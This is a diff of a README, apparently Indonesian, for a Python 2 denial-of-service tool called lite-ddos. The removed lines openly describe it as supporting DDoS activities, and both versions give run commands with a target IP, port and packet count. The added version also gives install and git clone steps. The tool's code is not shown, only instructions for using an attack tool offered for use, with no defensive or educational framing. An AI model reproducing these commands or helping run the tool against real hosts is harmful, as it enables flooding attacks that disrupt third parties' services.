@@ -1,2 +1,6 @@
-# LITEDDOS
-This Tool Is Supporting For DDOS Activities, The Way Is Typing Command :  $ python2 islddos.py &lt;ip> &lt;port> &lt;packet>   example:  $python2 islddos.py 104.27.190.77 8080 100  IP target: 104.27.190.77 port: 8080 packet:100  Made In indonesia Indonesia Security Lite
+lite-ddos
+$  sudo apt installl  git python2
+$ git clone https://github.com/AnakIntelligent/lite-ddos.git
+$ cd lite-ddos
+$ python2 lite-ddos.py <ip> <port>  <jumlah>
+contoh: python2 lite-ddos  111.1.11.11 80 999
